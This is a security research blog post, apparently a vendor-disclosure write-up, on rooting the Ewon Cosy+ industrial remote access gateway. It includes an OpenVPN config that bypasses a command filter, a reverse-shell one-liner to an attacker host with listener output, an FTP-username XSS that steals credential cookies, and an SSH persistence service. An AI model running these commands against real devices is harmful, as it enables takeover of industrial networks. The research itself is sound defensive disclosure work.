<!DOCTYPE html>



<html lang="en-US" 
  
    mode="light"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Hacking a Secure Industrial Remote Access Gateway" />
<meta name="author" content="Moritz Abrell" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this blog post, we describe the security analysis and the found vulnerabilities in the industrial remote access solution Ewon Cosy+." />
<meta property="og:description" content="In this blog post, we describe the security analysis and the found vulnerabilities in the industrial remote access solution Ewon Cosy+." />
<link rel="canonical" href="https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/" />
<meta property="og:url" content="https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/" />
<meta property="og:site_name" content="SySS Tech Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-11T16:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hacking a Secure Industrial Remote Access Gateway" />
<meta name="twitter:site" content="@" />
<meta name="twitter:creator" content="@Moritz Abrell" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Moritz Abrell"},"dateModified":"2024-08-11T16:00:00+02:00","datePublished":"2024-08-11T16:00:00+02:00","description":"In this blog post, we describe the security analysis and the found vulnerabilities in the industrial remote access solution Ewon Cosy+.","headline":"Hacking a Secure Industrial Remote Access Gateway","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/"},"url":"https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Hacking a Secure Industrial Remote Access Gateway | SySS Tech Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="SySS Tech Blog">
<meta name="application-name" content="SySS Tech Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <!-- <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"> -->
  <!-- <link rel="dns-prefetch" href="https://fonts.gstatic.com"> -->

  <!-- GA -->
  
    <link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials">
    <link rel="dns-prefetch" href="https://www.google-analytics.com">

    <link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous">
    <link rel="dns-prefetch" href="https://www.googletagmanager.com">

    
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
        href="/assets/css/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css">



  <!-- JavaScripts -->

  <script src="/assets/js/lib/jquery.min.js"></script>

  <script defer
          src="/assets/js/lib/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async src="/assets/js/lib/lozad.min.js"></script>
  <script async src="/assets/js/lib/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>




  <!-- PWA -->
  <script defer src="/app.js"></script>

  <!-- GA -->
  




</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/syss_logo.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">SySS Tech Blog</a>
    </div>

    <div class="site-subtitle font-italic">IT Security Know-how</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/advisories/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ADVISORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/videos/" class="nav-link">
        <i class="fa-fw fas fa-video ml-xl-3 mr-xl-3 unloaded"></i>
        <span>VIDEOS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-user ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/imprint/" class="nav-link">
        <i class="fa-fw fas fa-stamp ml-xl-3 mr-xl-3 unloaded"></i>
        <span>IMPRINT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/SySS-Research" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://www.youtube.com/c/SySSPentestTV" aria-label="youtube"
        
        target="_blank" rel="noopener">
        <i class="fab fa-youtube"></i>
      </a>
      

    
      

      
      <a href="https://www.instagram.com/syssgmbh" aria-label="instagram"
        
        target="_blank" rel="noopener">
        <i class="fab fa-instagram"></i>
      </a>
      

    
      

      
      <a href="https://de.linkedin.com/company/syss-gmbh" aria-label="linkedin"
        
        target="_blank" rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
      

    
      

      
      <a href="https://www.xing.com/pages/syssgmbh" aria-label="xing"
        
        target="_blank" rel="noopener">
        <i class="fab fa-xing"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
        <span>
          
          
          <a href="/">
            Posts
          </a>
        </span>

        

      

        
          <span>Hacking a Secure Industrial Remote Access Gateway</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
  

  

  



<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Hacking a Secure Industrial Remote Access Gateway</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Moritz Abrell
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Aug 11, 2024,  4:00 PM +0200"
  

  
  prep="on" >

  
  

  
    Aug 11
  

  <i class="unloaded">2024-08-11T16:00:00+02:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4626 words">25 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <p>In this blog post, we describe the security analysis and the found vulnerabilities in the industrial remote access solution Ewon Cosy+.
<!--more--></p>

<h1 id="tldr">TL;DR</h1>

<p>We found security vulnerabilities in the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> that allow unauthenticated attackers to gain root access to the device.
With this access and by conducting further analyses, we found more issues allowing decrypting encrypted firmware files and encrypted data such as passwords in configuration files.</p>

<p>Furthermore, we were able to get correctly signed X.509 VPN certificates for foreign devices.
This allows attackers hijacking VPN sessions which results in significant security risks against users of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> and the adjacent industrial infrastructure.</p>

<p>This research was also presented at <a href="https://defcon.org/html/defcon-32/dc-32-speakers.html#54521">DEF CON 32</a>.</p>

<h1 id="introduction">Introduction</h1>

<p>Industrial VPN gateways play a crucial role in operational technology (OT) by enabling secure remote access to systems within industrial networks.
However, their importance goes hand in hand with increased security risks, as their architecture makes them lucrative targets for threat actors. 
Over the years, we have seen such devices being used in various industrial environments, which underlines their widespread use in critical infrastructures.</p>

<p>Examples of such solutions are <a href="https://www.hms-networks.com/industrial-remote-access">Ewon</a> devices by HMS.
Despite their widespread use, <a href="https://www.pentestpartners.com/security-blog/ewon-flexy-iot-router-a-deep-dive/">highlighted vulnerabilities</a> in these devices emphasize the urgent need for robust security measures. 
In light of the evolving threat landscape, the vendor has responded with the introduction of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>, which has a new hardware base and an increased focus on <a href="https://www.hms-networks.com/secure-remote-access">security</a>.</p>

<p>Given these promises, conducting a security analysis of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> seems to be a good challenge, and we decided to take a closer look at the security posture of this device.</p>

<h1 id="architecture">Architecture</h1>

<p>Many industrial remote access solutions operate by establishing a VPN connection between the router and a relay platform. 
When technicians need to connect to the machines, they initiate another VPN connection to the relay platform from their client usually by using software provided by the vendor. 
This same principle applies to the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Ewon Cosy+</a>.</p>

<p>The <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Ewon Cosy+</a> utilizes a VPN connection through OpenVPN to the Talk2m platform, which is hosted and maintained by the vendor. 
Technicians can connect to devices based on their assignments using the Windows software <a href="https://www.hms-networks.com/ecatcher">Ecatcher</a>. 
This software also establishes a VPN connection through OpenVPN.</p>

<p>This architecture can be abstracted as depicted in the following figure.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/architecture.png" alt="Architectural overview" />
<em>Architectural overview of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> and remote access</em></p>

<p>For further details on this concept, refer to the <a href="https://www.hms-networks.com/software-and-tools/talk2m/">vendor website</a>.</p>

<h1 id="hardware-layout">Hardware Layout</h1>

<p>The following images show the side and front view of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Ewon Cosy+</a>.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/side.png" alt="Ewon Cosy+ side view" />
<em>Ewon Cosy+ side view</em></p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/front.png" alt="Ewon Cosy+ front view" />
<em>Ewon Cosy+ front view</em></p>

<p>The disassembled device looks as follows:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/disasm.png" alt="Disassembled Ewon Cosy+" />
<em>Disassembled Ewon Cosy+</em></p>

<p>The most interesting components for the analysis can be found on the top board of the device and are highlighted in the following image:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/hw.png" alt="Interesting components on the top board" />
<em>Interesting components on the top board</em></p>

<h1 id="rooting-the-device">Rooting the Device</h1>

<p>Since encrypted drives and explicit hardware security are already promoted by the vendor and we did not want to destroy the device unintentionally in the first step, 
we initially refrained from hardware-based attacks. 
This means we would have to find vulnerabilities that allow us to learn more about the functionality of the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>.
The next most obvious approach would be to analyze the firmware.
But even here we won’t get any further, as firmware update files are encrypted (more on this in <a href="#firmware-encryption">firmware encryption</a>).</p>

<p>Nevertheless, we found a vulnerability which allows rooting the device.</p>

<h2 id="os-command-injection">OS command injection</h2>

<p>Rooting the device was relatively easy since we found a simple OS command injection and filter bypass in user-provided OpenVPN configurations.</p>

<p><a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> allows uploading user-defined OpenVPN configuration files.
OpenVPN on the other hand allows executing user-defined scripts or commands, e.g. using the parameters <code class="language-plaintext highlighter-rouge">up</code> and <code class="language-plaintext highlighter-rouge">down</code> (see <a href="https://openvpn.net/community-resources/reference-manual-for-openvpn-2-5/">OpenVPN manual</a>).</p>

<p>Wait, what? Can it be that simple?
Well, no.</p>

<p>The vendor implemented filter mechanisms trying to prevent using such parameters.</p>

<p>The following image shows the log entry of the prevented code execution through the OpenVPN configuration.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/forbidden.png" alt="Log entries showing forbidden OpenVPN configuration" />
<em>Log entries showing forbidden OpenVPN configuration</em></p>

<p>As a next step, we tried bypassing the filter and finally were successful by prefixing the parameter with two dashes (<code class="language-plaintext highlighter-rouge">--up</code>), as the following example illustrates:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>client
dev tun
persist-tun
proto tcp
remote device.vpn16.talk2m.com 443
verb 5
mute 20

--up '/bin/sh -c "id"'
script-security 2

&lt;ca&gt;
[...]
&lt;/ca&gt;

&lt;cert&gt;
[...]
&lt;/cert&gt;

&lt;key&gt;
[...]
&lt;/key&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Uploading this OpenVPN configuration to the device resulted in code execution, which can be seen in the following image.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/id.png" alt="Executed command shown in Cosy+ log" />
<em>Executed command shown in Cosy+ log</em></p>

<p>Next, we adapted the OpenVPN configuration to get a reverse shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>client
dev tun
persist-tun
proto tcp
remote device.vpn16.talk2m.com 443
verb 5
mute 20

--up '/bin/sh -c "TF=$(mktemp -u);mkfifo $TF;telnet 192.168.33.1 5000 0&lt;$TF | sh &gt;$TF 2&gt;&amp;1"'
script-security 2

&lt;ca&gt;
[...]
&lt;/ca&gt;

&lt;cert&gt;
[...]
&lt;/cert&gt;

&lt;key&gt;
[...]
&lt;/key&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>After uploading this configuration, we received a reverse shell, and due to the fact that OpenVPN is executed with <code class="language-plaintext highlighter-rouge">root</code> privileges, we finally rooted the device:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>$ nc -lvp 5000
Listening on 0.0.0.0 5000
Connection received on 192.168.33.194 40424
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/hostname
ewon4
</pre></td></tr></tbody></table></code></div></div>

<h2 id="cross-site-scripting">Cross-site scripting</h2>

<p>Since rooting the device requires administrative access to the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>, we looked for other vulnerabilities to get around this.</p>

<p>Eventually, we found a persistent cross-site scripting (XSS) vulnerability which can be triggered by unauthenticated attackers by log poisoning the FTP service.</p>

<p>The submitted username of an FTP authentication attempt is written to a log file which is then parsed and visible in the web interface of the device:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ ftp "&lt;h1&gt;SySS&lt;/h1&gt;"@10.0.0.53
</pre></td></tr></tbody></table></code></div></div>

<p>Due to missing input sanitization, HTML or JavaScript code can be injected this way, as the following figure illustrates.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/ftp.png" alt="Cosy+ log containing submitted FTP username" />
<em>Cosy+ log containing submitted FTP username</em></p>

<p>In addition, the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> stores the Base64-encoded credentials of the current web session in the unprotected cookie named <code class="language-plaintext highlighter-rouge">credentials</code>:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/xss.png" alt="Accessing the credential cookie via XSS" width="80%" />
<em>Accessing the credential cookie via XSS</em></p>

<p>Therefore, attackers can leverage the XSS vulnerability to access the cookie, send it back to themselves, access the plaintext credentials, and finally gain administrative access to the device.</p>

<h2 id="exploit-chain">Exploit chain</h2>

<p>An unauthenticated attacker can gain <code class="language-plaintext highlighter-rouge">root</code> access to the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> by combining the found vulnerabilities and e.g. waiting for an admin user to log in to the device.</p>

<p>This resulting exploit chain can be illustrated as follows:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/root-chain.png" alt="Exploit chain to root the Cosy+ from the perspective of an unauthenticated attacker" />
<em>Exploit chain to root the Cosy+ from the perspective of an unauthenticated attacker</em></p>

<h2 id="persistence">Persistence</h2>

<p>Our initial intention was to gain access to the device and conduct further analyses.</p>

<p>For having a more comfortable system access, we used the reverse shell access to deploy our own <code class="language-plaintext highlighter-rouge">systemd</code> service starting a statically linked <code class="language-plaintext highlighter-rouge">dropbear</code> SSH service using the the following configuration:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>[Unit]
Description=ssh
After=network.target

[Service]
ExecStart=/usr/bin/dropbear -p 8022 -R
Type=forking
Restart=on-failure
PIDFile=/var/run/dropbear.pid

[Install]
WantedBy=multi-user.target
</pre></td></tr></tbody></table></code></div></div>

<p>Finally, we are able to access the device via SSH as <code class="language-plaintext highlighter-rouge">root</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>$ ssh -p 8022 root@10.0.0.53
root@10.0.0.53's password:
root@ewon-2403-0999-25:~# id
uid=0(root) gid=0(root) groups=0(root)
</pre></td></tr></tbody></table></code></div></div>

<h1 id="hardware-security-module">Hardware Security Module</h1>

<p>As described on the product website, the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> uses a hardware security module (HSM) to ensure that secrets as well as providing cryptographic functionalities are kept secure.</p>

<p>The HSM is a <code class="language-plaintext highlighter-rouge">SE050A1</code> from NXP which is also known as <a href="https://www.nxp.com/products/security-and-authentication/authentication/edgelock-se050-plug-and-trust-secure-element-family-enhanced-iot-security-with-high-flexibility:SE050">EdgeLock</a>:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/hsm.png" alt="SE050A1 HSM in the Cosy+" width="80%" />
<em>SE050A1 HSM in the Cosy+</em></p>

<p>In this section, we take a closer look at this HSM.</p>

<h2 id="communication">Communication</h2>

<p>According to an <a href="https://www.nxp.com/docs/en/application-note/AN13013.pdf">application note</a> and to the <a href="https://www.nxp.com/docs/en/application-note/AN12413.pdf#%5B%7B%22num%22%3A3060%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C50%2C725.055%2Cnull%5D">APDU specification</a> of the SE050, 
the I²C communication can be either secured and encrypted using the Secure Channel Protocol 03 (SCP03) or it is not protected at all.</p>

<p>Therefore, we first checked this by capturing the bus communication using a logic analyzer:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/pcbite2.png" alt="Analyzing the I²C communication" width="80%" />
<em>Analyzing the I²C communication</em></p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/pcbite.png" alt="Positioning of the testing needles" width="80%" />
<em>Positioning of the testing needles</em></p>

<p>During this, we noticed that the communication is not secured and that we can see the APDU command structure, as demonstrated in the following figure:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/logic.png" alt="I²C communication and APDU command" />
<em>I²C communication and APDU command</em></p>

<p>However, the payload itself seems not to be plaintext.
Thus, we cannot extract sensitive data by simply eavesdropping on the I²C communication.</p>

<h2 id="static-and-dynamic-analysis">Static and dynamic analysis</h2>

<p>Due to the payload encryption, we did further dynamic and static analyses of binaries communicating with the HSM.
This involved static analyses using <a href="https://ghidra-sre.org/">Ghidra</a> and dynamic approaches using a statically linked <a href="https://www.sourceware.org/gdb/">GDB</a> on the device itself:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/gdb.png" alt="Excerpt of dynamic analysis of the I²C communication using GDB" width="80%" />
<em>Excerpt of dynamic analysis of the I²C communication using GDB</em></p>

<p>After some time, we gained better understanding of the secure communication which roughly works as follows:</p>

<ol>
  <li>The first 4 bytes from the unencrypted flash memory <code class="language-plaintext highlighter-rouge">/dev/mtd3</code> are read, and they represent the length of data to be read in the following step.</li>
  <li>The determined length (in our case <code class="language-plaintext highlighter-rouge">0xa9</code> or <code class="language-plaintext highlighter-rouge">169</code> decimal) of data is read from the unencrypted flash memory <code class="language-plaintext highlighter-rouge">/dev/mtd3</code> starting from offset <code class="language-plaintext highlighter-rouge">0x03</code>.</li>
  <li>The read data is decrypted using the Cryptographic Acceleration and Assurance Module (CAAM) of the i.MX6.</li>
  <li>The decrypted data is used to derive and generate session-specific keys.</li>
  <li>Finally, the data is encrypted using AES in CBC mode with a key length of 256 bit.</li>
</ol>

<p>The following image illustrates the I²C payload encryption:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/i2c-encryption.png" alt="I²C payload encryption overview" />
<em>I²C payload encryption overview</em></p>

<p><strong>Note:</strong> Since we analyzed a single device, we cannot verify if the content of <code class="language-plaintext highlighter-rouge">/dev/mtd3</code> and the keys used in CAAM differ between devices.
If not, this potential key reuse can be exploited by attackers with physical access to decrypt the I²C communication.</p>

<h2 id="key-access">Key access</h2>

<p>Another interesting question is, if the secrets stored within the HSM can be accessed.</p>

<p>In order to answer this question, we used the <a href="https://github.com/NXP/plug-and-trust">Plug and Trust middleware</a>, 
quickly developed a minimalistic tool to check the policy based on the provided examples, cross-compiled it on a compatible ARM-based system, and executed it on the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a>.</p>

<p>For example, we tried accessing the secrets, for instance the ECC key with the ID <code class="language-plaintext highlighter-rouge">0xEF0000B0</code>.
However, read access was denied due to enabled policies and thus the keys cannot be extracted even with <code class="language-plaintext highlighter-rouge">root</code> access on the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> device:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/policy.png" alt="Attempt to read the ECC private key" />
<em>Attempt to read the ECC private key</em></p>

<h1 id="back-end-communication">Back-End Communication</h1>

<p>The communication between the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> and the Talk2m API is done via HTTPS and secured via mutual TLS (mTLS) authentication.</p>

<p>The following image shows an exemplary capture of such an HTTPS communication.</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/mtls.png" alt="HTTPS communication between the Cosy+ and the Talk2m API secured by mTLS" />
<em>HTTPS communication between the Cosy+ and the Talk2m API secured by mTLS</em></p>

<p>Since the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> and the Talk2m are both enforcing X.509 certificate validation, we cannot simply access the plaintext communication.
Thus, we further analyzed the <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> and, for example, found the usage of the X.509 public key <code class="language-plaintext highlighter-rouge">/tmp/birth_key_crt.pem</code> and the ECC private key <code class="language-plaintext highlighter-rouge">/tmp/birth_key_ref.pem</code> within the binary <code class="language-plaintext highlighter-rouge">/usr/bin/ewon</code>, as the following figure illustrates:</p>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/papers/industrial-router/refkey.png" alt="Client certificate and key passed to __xstat" />
<em>Client certificate and key passed to the function <code class="language-plaintext highlighter-rouge">\_\_xstat</code></em></p>

<p>However, while the public key looks fine, the ECC private key is mainly filled with <code class="language-plaintext highlighter-rouge">0x00</code> bytes, as the OpenSSL output shows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>$ openssl ec -in birth_key_ref.pem -text
read EC key
Private-Key: (521 bit)
priv:
    10:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:ef:00:00:b0:a5:a6:b5:b6:
    a5:a6:b5:b6:10:00
pub:
